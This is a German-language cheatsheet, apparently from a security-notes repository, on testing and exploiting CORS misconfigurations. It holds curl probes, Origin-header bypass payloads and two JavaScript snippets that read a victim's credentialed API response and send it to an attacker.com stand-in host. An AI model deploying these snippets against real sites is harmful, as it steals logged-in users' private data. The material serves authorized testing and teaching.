# 🌍 Cheatsheet zu CORS-Fehlkonfigurationen

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Cross-Origin Resource Sharing
```

---

## 🎯 Was ist CORS?

**CORS** (Cross-Origin Resource Sharing, Freigabe von Ressourcen für andere Ursprünge) regelt, welche Origins auf Ressourcen zugreifen dürfen. Ein Origin bezeichnet einen Ursprung aus Protokoll, Hostname und Port. Fehlkonfigurationen können es Angreifern ermöglichen, sensible Daten über Ursprungsgrenzen hinweg auszulesen.

---

## 🔍 CORS testen

### Einfacher Test
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Antwortheader prüfen:
Access-Control-Allow-Origin: https://evil.com  # Verwundbar!
Access-Control-Allow-Credentials: true         # Besonders gefährlich!
```

### Test-Payloads für den Origin-Header
```
# Prüfung auf exakte Übereinstimmung umgehen
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# Null-Origin
null

# Subdomain
https://sub.target.com

# Wechsel zum unsicheren Protokoll
http://target.com
```

---

## 💉 Ausnutzung

### Daten auslesen (mit Zugangsinformationen)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Daten an den Angreifer senden
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

### Variante mit der Fetch API
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

## 📊 Schwachstellenmatrix

| ACAO-Header | ACAC | Risiko |
|-------------|------|------|
| `*` | false | Gering (ohne Zugangsinformationen) |
| `*` | true | Ungültige Konfiguration |
| Origin des Angreifers | true | **KRITISCH** |
| null | true | **HOCH** |
| Zurückgespiegelter Origin | true | **KRITISCH** |

### Gefährliche Muster
```http
# Spiegelt jeden Origin zurück
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# Erlaubt null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## 🛠️ Schnellprüfungen

```bash
# Automatisierung mit curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

## 📚 Ressourcen

- [PortSwigger: CORS](https://portswigger.net/web-security/cors)
- [Cheatsheet zur Ausnutzung von CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 CORS ausnutzen!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>

## 📝 Technische Hinweise zur Vorlage

- **Browserkontrolle und Aussagekraft der Tests:** CORS steuert, ob Browser Skripten den Zugriff auf Antworten anderer Origins erlauben; es ersetzt weder Authentifizierung noch serverseitige Zugriffskontrollen. Ein zurückgespiegelter Header allein belegt noch keinen Datenabfluss: Entscheidend sind der tatsächliche Browserkontext, die Lesbarkeit der Antwort und deren Inhalt. Die Risikostufen der Matrix sind daher Richtwerte. Auch ohne Zugangsinformationen kann die Freigabe interner oder sensibler Daten relevant sein. Siehe [PortSwigger: CORS](https://portswigger.net/web-security/cors).
- **Zugangsinformationen und Headerwerte:** ACAO steht für Access-Control-Allow-Origin, ACAC für Access-Control-Allow-Credentials. Mit dem Credentials-Modus include akzeptiert der Browser beim ACAO-Header keinen Stern als Freigabe. Für ACAC ist nur der exakte Wert true gültig; false in der Matrix bedeutet hier, dass keine Freigabe für Zugangsinformationen vorliegt, und ist kein gültiger Headerwert. Die Angabe include erzwingt außerdem keine Cookieübertragung entgegen geltenden Cookie-Regeln. Ein null-Origin ist ein eigener serialisierter Originwert und darf nicht pauschal als vertrauenswürdig gelten. Siehe [WHATWG Fetch: CORS und Credentials](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials).
- **curl und Payload-Grenzen:** Die Option -I sendet bei HTTP einen HEAD-Request. Die oben gezeigten Headerzeilen sind Beispielantworten und keine Shell-Befehle. curl setzt die CORS-Lesebeschränkungen eines Browsers nicht durch. Ein frei gesetzter Origin-Header oder ein Parser-Sonderfall aus der Liste beweist deshalb keine im Browser ausnutzbare Schwachstelle. Siehe [curl: --head](https://curl.se/docs/manpage.html#-I) und [PortSwigger: Fehler beim Parsen von Origins](https://portswigger.net/web-security/cors#errors-parsing-origin-headers).
- **Grenze der JavaScript-Beispiele:** btoa verarbeitet Zeichen als Bytewerte und kann bei Unicode-Zeichen oberhalb von U+00FF eine Ausnahme auslösen. Die Beispiele bleiben wie im Original erhalten und sind für beliebige Antworttexte nicht allgemein robust. Siehe [WHATWG HTML: Base64-Hilfsmethoden](https://html.spec.whatwg.org/multipage/webappapis.html#base64-utility-methods).